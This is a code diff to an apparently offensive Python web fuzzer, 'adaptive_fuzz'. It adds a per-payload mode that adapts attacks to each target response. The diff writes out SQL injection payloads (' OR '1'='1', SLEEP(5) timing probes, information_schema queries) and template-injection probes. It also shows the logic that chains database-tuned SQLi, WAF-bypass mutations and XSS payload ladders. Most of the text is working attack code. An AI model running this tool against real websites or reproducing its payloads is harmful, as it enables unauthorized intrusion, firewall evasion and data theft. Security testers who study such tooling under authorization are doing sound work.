@@ -21,6 +21,13 @@ working payload list based on what came back:
   breaking mutations (XSS probe ladder).
 * Connection / 5xx anomaly   -> flag target instability, back off.
 
+granular=True switches the adaptation from round-wide (one mutation family
+per round) to PER-PAYLOAD: every response mutates only the payload that
+produced it (sql_error payload -> its DB-tuned siblings; blocked payload ->
+bypass mutations of itself; reflected payload -> XSS ladder), while
+unsignalled payloads are retried with a different mutator. Round-wide mode
+stays available as granular=False.
+
 Each round keeps signals of what worked (anomaly delta vs baseline), narrows
 towards the highest-signal payload family and reports a full round-by-round
 log with the final adapted payload set, so the operator sees exactly why the
@@ -286,7 +293,8 @@ def _classify_response(resp, elapsed, baseline_time, baseline_status):
 # ------------------------------------------------------------ main fuzzer --
 
 def adaptive_fuzz(target_url, initial_payload_set="", max_rounds=6,
-                  method="GET", param="q", request_timeout=8):
+                  method="GET", param="q", request_timeout=8,
+                  granular=True):
     """Closed-loop adaptive fuzzer. Returns JSON string with:
     baseline info, round-by-round log (what response was parsed, which
     mutation family was applied, which payloads were kept), adapted payload
@@ -308,7 +316,9 @@ def adaptive_fuzz(target_url, initial_payload_set="", max_rounds=6,
     start_all = time.time()
 
     # ---- parse initial payload set
-    if isinstance(initial_payload_set, str) and \
+    if isinstance(initial_payload_set, (list, tuple)):
+        payloads = list(initial_payload_set)
+    elif isinstance(initial_payload_set, str) and \
             initial_payload_set.strip().startswith("["):
         try:
             payloads = json.loads(initial_payload_set)
@@ -421,56 +431,107 @@ def adaptive_fuzz(target_url, initial_payload_set="", max_rounds=6,
         anomalies_this_round = [s.get("anomaly") for s in
                                 round_log["parsed_signals"] if s.get("anomaly")]
 
-        if "sql_error" in anomalies_this_round and db_engine_detected:
-            tuned = SQLI_BY_DB.get(db_engine_detected, SQLI_BY_DB[
-                "generic-sql"])
-            next_payloads = tuned + [random.choice(SQLI_BY_DB["generic-sql"])
-                                     for _ in range(3)]
-            mutation_applied = ("sqli_tuned:%s" % db_engine_detected)
-
-        elif "waf_block" in anomalies_this_round:
-            mutated = []
-            for p in payloads[:MAX_PAYLOADS_PER_ROUND]:
-                mp, mname = _mutate_waf(p)
-                mutated.append((mp, mname))
-            next_payloads = [m[0] for m in mutated]
-            mutation_applied = ("waf_bypass:" + ",".join(
-                sorted({m[1] for m in mutated})))
-
-        elif "reflection" in anomalies_this_round:
-            next_payloads = XSS_REFLECTION_PAYLOADS + [
-                _randomize_case(p) for p in
-                random.sample(payloads, min(3, len(payloads)))]
-            mutation_applied = "reflection_xss_ladder"
-
-        elif "stack_trace" in anomalies_this_round:
-            fw = None
-            for s in round_log["parsed_signals"]:
-                if s.get("stack_trace"):
-                    fw = s["stack_trace"]
-                    break
-            next_payloads = STACK_TRACE_PROBES + TYPE_CONFUSION
-            mutation_applied = ("stack_trace_probe:" + (fw or "unknown"))
-
-        elif "time_delay" in anomalies_this_round:
-            # keep timing-based payloads, deepen them
-            next_payloads = [p + " AND SLEEP(5)-- -" if "'" in p
-                             else p for p in working_payloads[:4]]
-            next_payloads += ["' AND (SELECT COUNT(*) FROM "
-                              "information_schema.tables)>0-- -"]
-            mutation_applied = "timing_deepen"
-
-        elif "server_error" in anomalies_this_round:
-            next_payloads = ["' OR '1'='1'-- -", "{{7*7}}", "${7*7}", "[]",
-                             "%00", "A" * 100]
-            mutation_applied = "type_confusion"
-
+        if granular:
+            # PER-PAYLOAD adaptation: each response mutates only the
+            # payload that produced it; unsignalled payloads get a
+            # different mutator for the next round.
+            next_payloads = []
+            mut_names = set()
+            for sig in round_log["parsed_signals"]:
+                base = sig.get("payload") or ""
+                anom = sig.get("anomaly")
+                if anom == "sql_error" and db_engine_detected:
+                    tuned = SQLI_BY_DB.get(db_engine_detected,
+                                           SQLI_BY_DB["generic-sql"])
+                    next_payloads.extend(tuned[:4])
+                    mut_names.add("sqli_tuned:%s" % db_engine_detected)
+                elif anom == "waf_block":
+                    mp, mn = _mutate_waf(base or random.choice(payloads))
+                    next_payloads.append(mp)
+                    mut_names.add("waf_bypass:%s" % mn)
+                elif anom == "reflection":
+                    next_payloads.extend(random.sample(
+                        XSS_REFLECTION_PAYLOADS, 3))
+                    mut_names.add("reflection_xss_ladder")
+                elif anom == "stack_trace":
+                    next_payloads.extend(random.sample(
+                        STACK_TRACE_PROBES, 4))
+                    mut_names.add("stack_trace_probe:%s"
+                                  % (sig.get("stack_trace") or "unknown"))
+                elif anom == "time_delay":
+                    if "'" in base:
+                        next_payloads.append(base + " AND SLEEP(5)-- -")
+                    mut_names.add("timing_deepen")
+                elif anom == "server_error":
+                    next_payloads.extend(random.sample(
+                        TYPE_CONFUSION, 3))
+                    mut_names.add("type_confusion")
+                else:
+                    # no signal on this payload: retry with a fresh mutator
+                    mp, mn = _mutate_waf(base)
+                    if mp != base:
+                        next_payloads.append(mp)
+                        mut_names.add("retry_mutated:%s" % mn)
+                    else:
+                        next_payloads.append(base)
+            mutation_applied = "granular:" + ",".join(
+                sorted(mut_names)) if mut_names else "granular:steady"
+            next_payloads = next_payloads or payloads
         else:
-            # no signal: broaden with a mixed probe set
-            next_payloads = (payloads[:6] +
-                             random.sample(STACK_TRACE_PROBES,
-                                           min(4, len(STACK_TRACE_PROBES))))
-            mutation_applied = "broaden_no_signal"
+            anomalies_this_round = [s.get("anomaly") for s in
+                                    round_log["parsed_signals"]
+                                    if s.get("anomaly")]
+
+            if "sql_error" in anomalies_this_round and db_engine_detected:
+                tuned = SQLI_BY_DB.get(db_engine_detected, SQLI_BY_DB[
+                    "generic-sql"])
+                next_payloads = tuned + [random.choice(SQLI_BY_DB["generic-sql"])
+                                         for _ in range(3)]
+                mutation_applied = ("sqli_tuned:%s" % db_engine_detected)
+
+            elif "waf_block" in anomalies_this_round:
+                mutated = []
+                for p in payloads[:MAX_PAYLOADS_PER_ROUND]:
+                    mp, mname = _mutate_waf(p)
+                    mutated.append((mp, mname))
+                next_payloads = [m[0] for m in mutated]
+                mutation_applied = ("waf_bypass:" + ",".join(
+                    sorted({m[1] for m in mutated})))
+
+            elif "reflection" in anomalies_this_round:
+                next_payloads = XSS_REFLECTION_PAYLOADS + [
+                    _randomize_case(p) for p in
+                    random.sample(payloads, min(3, len(payloads)))]
+                mutation_applied = "reflection_xss_ladder"
+
+            elif "stack_trace" in anomalies_this_round:
+                fw = None
+                for s in round_log["parsed_signals"]:
+                    if s.get("stack_trace"):
+                        fw = s["stack_trace"]
+                        break
+                next_payloads = STACK_TRACE_PROBES + TYPE_CONFUSION
+                mutation_applied = ("stack_trace_probe:" + (fw or "unknown"))
+
+            elif "time_delay" in anomalies_this_round:
+                # keep timing-based payloads, deepen them
+                next_payloads = [p + " AND SLEEP(5)-- -" if "'" in p
+                                 else p for p in working_payloads[:4]]
+                next_payloads += ["' AND (SELECT COUNT(*) FROM "
+                                  "information_schema.tables)>0-- -"]
+                mutation_applied = "timing_deepen"
+
+            elif "server_error" in anomalies_this_round:
+                next_payloads = ["' OR '1'='1'-- -", "{{7*7}}", "${7*7}", "[]",
+                                 "%00", "A" * 100]
+                mutation_applied = "type_confusion"
+
+            else:
+                # no signal: broaden with a mixed probe set
+                next_payloads = (payloads[:6] +
+                                 random.sample(STACK_TRACE_PROBES,
+                                               min(4, len(STACK_TRACE_PROBES))))
+                mutation_applied = "broaden_no_signal"
 
         # dedupe, cap, rotate for next round
         seen = set()
@@ -486,6 +547,7 @@ def adaptive_fuzz(target_url, initial_payload_set="", max_rounds=6,
         rounds.append(round_log)
 
     result = {
+        "ok": True,
         "tool": "adaptive_fuzz",
         "target": target_url,
         "method": method,
